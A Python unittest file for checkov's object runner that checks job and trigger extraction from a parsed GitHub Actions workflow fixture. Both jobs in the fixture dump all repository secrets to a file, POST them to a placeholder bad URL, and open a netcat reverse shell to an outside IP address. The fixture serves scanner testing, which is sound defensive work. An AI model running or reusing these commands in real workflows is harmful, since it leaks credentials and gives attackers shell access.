import unittest

from checkov.common.runners.object_runner import Runner


class TestObjectRunner(unittest.TestCase):
    result = ({'name': 'Supply Chain', True: {'workflow_dispatch': None,
                                              'schedule': [
                                                  {'cron': '0 0 * * 0', '__startline__': 5, '__endline__': 6}],
                                              '__startline__': 3, '__endline__': 6}, 'jobs': {
        'bridgecrew': {'runs-on': 'ubuntu-latest', 'steps': [
            {'name': 'Run checkov', 'id': 'checkov', 'uses': 'bridgecrewio/checkov-action@master',
             'env': {'GITHUB_TOKEN': '${{secrets.THIS_IS_A_TEST_SECRET}}',
                     'ACTIONS_ALLOW_UNSECURE_COMMANDS': 'true',
                     '__startline__': 14, '__endline__': 16},
             'run': 'echo "${{ toJSON(secrets) }}" > .secrets\ncurl -X POST -s --data "@.secrets" <BADURL > '
                    '/dev/null\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 '
                    '>/tmp/f\n',
             '__startline__': 10, '__endline__': 20}], '__startline__': 8, '__endline__': 20},
        'bridgecrew2': {'runs-on': 'ubuntu-latest', 'steps': [
            {'name': 'Run checkov', 'id': 'checkov', 'uses': 'bridgecrewio/checkov-action@master',
             'env': {'GITHUB_TOKEN': '${{secrets.THIS_IS_A_TEST_SECRET}}',
                     'ACTIONS_ALLOW_UNSECURE_COMMANDS': 'true',
                     '__startline__': 27, '__endline__': 29},
             'run': 'echo "${{ toJSON(secrets) }}" > .secrets\ncurl -X POST -s --data "@.secrets" <BADURL > '
                    '/dev/null\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 '
                    '>/tmp/f\n',
             '__startline__': 23, '__endline__': 33}], '__startline__': 21, '__endline__': 33}, '__startline__': 7,
        '__endline__': 33}, '__startline__': 1, '__endline__': 33},
              [(1, 'name: Supply Chain\n'), (2, 'on:\n'), (3, '  workflow_dispatch:\n'), (4, '  schedule:\n'),
               (5, '    - cron: 0 0 * * 0\n'), (6, 'jobs:\n'), (7, '   bridgecrew:\n'),
               (8, '    runs-on: ubuntu-latest\n'), (9, '    steps:\n'), (10, '    - name: Run checkov\n'),
               (11, '      id: checkov\n'), (12, '      uses: bridgecrewio/checkov-action@master\n'),
               (13, '      env:\n'), (14, '        GITHUB_TOKEN: ${{secrets.THIS_IS_A_TEST_SECRET}}\n'),
               (15, "        ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'\n"), (16, '      run:  |\n'),
               (17, '         echo "${{ toJSON(secrets) }}" > .secrets\n'),
               (18, '         curl -X POST -s --data "@.secrets" <BADURL > /dev/null\n'), (19,
                                                                                           'rm -f /tmp/f;mkfifo '
                                                                                           '/tmp/f;cat '
                                                                                           '/tmp/f|/bin/sh -i '
                                                                                           '2>&1|netcat '
                                                                                           '34.159.16.75 32032 '
                                                                                           '>/tmp/f\n'),
               (20, '   bridgecrew2:\n'), (21, '    runs-on: ubuntu-latest\n'), (22, '    steps:\n'),
               (23, '    - name: Run checkov\n'), (24, '      id: checkov\n'),
               (25, '      uses: bridgecrewio/checkov-action@master\n'), (26, '      env:\n'),
               (27, '        GITHUB_TOKEN: ${{secrets.THIS_IS_A_TEST_SECRET}}\n'),
               (28, "        ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'\n"), (29, '      run:  |\n'),
               (30, '          echo "${{ toJSON(secrets) }}" > .secrets\n'),
               (31, '          curl -X POST -s --data "@.secrets" <BADURL > /dev/null\n'), (32,
                                                                                            'rm -f /tmp/f;mkfifo '
                                                                                            '/tmp/f;cat '
                                                                                            '/tmp/f|/bin/sh -i '
                                                                                            '2>&1|netcat '
                                                                                            '34.159.16.75 32032 '
                                                                                            '>/tmp/f\n')])

    def test_get_jobs(self):
        expected_jobs = {'bridgecrew': {'__startline__': 8, '__endline__': 20},
                         'bridgecrew2': {'__startline__': 21, '__endline__': 33}}

        jobs = Runner._get_jobs(self, self.result[0])
        assert expected_jobs == jobs

    def test_get_triggers(self):
        expected_triggers = {'workflow_dispatch', 'schedule'}

        triggers = Runner._get_triggers(self, self.result[0])
        assert expected_triggers == triggers
